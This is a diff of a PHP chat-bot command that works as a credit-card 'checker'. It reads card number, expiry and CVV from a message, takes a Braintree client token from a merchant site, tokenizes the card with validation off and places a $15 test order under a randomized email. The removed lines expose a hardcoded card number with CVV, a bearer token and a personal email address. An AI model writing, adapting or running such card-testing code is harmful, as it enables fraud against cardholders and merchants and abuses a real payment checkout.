@@ -472,25 +472,52 @@ fclose($fp);
 
 
 
-if (strpos($message, ".pr") === 0 || strpos($message, "!pr") === 0 || strpos($message, "/pr") === 0) {
+if (strpos($message, ".ze") === 0 || strpos($message, "!ze") === 0 || strpos($message, "/ze") === 0) {
 
 	sendPv($myid, 'error2..');
-$lista = "5218071187489214|08|2028|796";
-                                                                             //$lista = substr($message, 5);
+
+
+$lista = substr($message, 4);
 $i     = explode("|", $lista);
-$cc    = $i[0];                                                              $mes   = $i[1];
-$ano  = $i[2];
+$cc    = $i[0];
+$mes   = $i[1];
+$ano   = $i[2];
 $cvv   = $i[3];
+
 
 $headers = array();
 $headers[] = "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36";
-$headers[] = "authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjUzMTU4NzYsImp0aSI6IjJkOWRiZDk0LTA4ZWMtNDJhNS04MDUxLTEwNDAxN2ZiYzUyZSIsInN1YiI6Imc3Y2JjdHluc2c0ZmJqY3giLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imc3Y2JjdHluc2c0ZmJqY3giLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.Q8Ui48a1YcXyZqZQoYWkeo-k3-5p5HhcdRWZna43klcu9iZsEP-oiBpL5PMF9HQNEZ__FbpC5hgsmDMyB1se9A";
+$headers[] = 'sec-ch-ua-platform: "Android"';
+$headers[] = "accept-language: es-US,es;q=0.7";
+$headers[] = "origin: https://zephyr-sim.com";
+$headers[] = "referer: https://zephyr-sim.com/";
+$headers[] = "accept-encoding: gzip, deflate, br, zstd";
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://api.zephyr-sim.com/v2/braintree/token");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36');
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_HTTPGET, 1); // Cambiado a GET
+$json = curl_exec($ch);
+
+$decoded_response = base64_decode($json);
+preg_match('/"authorizationFingerprint":"(.*?)"/', $decoded_response, $matches);
+$bearer = $matches[1];
+
+$guid = uniqid();
+
+
+$headers = array();
+$headers[] = "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36";
+$headers[] = "authorization: Bearer $bearer";
 $headers[] = "braintree-version: 2018-05-10";
 $headers[] = "content-type: application/json";
 $headers[] = "accept-language: es-US,es;q=0.7";
 $headers[] = "origin: https://assets.braintreegateway.com";
-$headers[] = "sec-fetch-site: cross-site";
-$headers[] = "sec-fetch-dest: empty";
 $headers[] = "referer: https://assets.braintreegateway.com/";
 
 $ch = curl_init();
@@ -502,30 +529,22 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"1fd1a352-ba99-489a-947b-e606f6518a92"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"12000"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$guid.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"12000"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 $json = curl_exec($ch);
 $data = json_decode($json, true);
 // Extraemos el token
 $token = $data['data']['tokenizeCreditCard']['token'];
 
-
 $headers = array();
-$headers[] = "content-length: 285";
-$headers[] = 'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"';
-$headers[] = 'sec-ch-ua-platform: "Android"';
-$headers[] = "sec-ch-ua-mobile: ?1";
 $headers[] = "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36";
 $headers[] = "content-type: application/json";
-$headers[] = "sec-gpc: 1";
 $headers[] = "accept-language: es-US,es;q=0.7";
 $headers[] = "origin: https://zephyr-sim.com";
-$headers[] = "sec-fetch-site: same-site";
-$headers[] = "sec-fetch-mode: cors";
-$headers[] = "sec-fetch-dest: empty";
 $headers[] = "referer: https://zephyr-sim.com/";
 $headers[] = "accept-encoding: gzip, deflate, br, zstd";
-$headers[] = "priority: u=1, i";
+
+$correo = 'rigoj' . rand(100, 999) . '@gmail.com';
 
 $url = "https://api.zephyr-sim.com/v2/orders/braintree";
 $ch = curl_init();
@@ -537,7 +556,7 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"paymentMethodNonce":"'.$token.'","email":"rigoj48@gmail.com","cart":[{"productId":"ADV-LOC","quantity":1,"isUpsell":false,"isDownsell":false}],"billingCountry":"MX","billingStateProvince":"MEX","billingPostalCode":"12000","expedited":false,"total":15}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"paymentMethodNonce":"'.$token.'","email":"'.$correo.'","cart":[{"productId":"ADV-LOC","quantity":1,"isUpsell":false,"isDownsell":false}],"billingCountry":"US","billingStateProvince":"NY","billingPostalCode":"10080","expedited":false,"total":15}');
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 $json = curl_exec($ch);
 
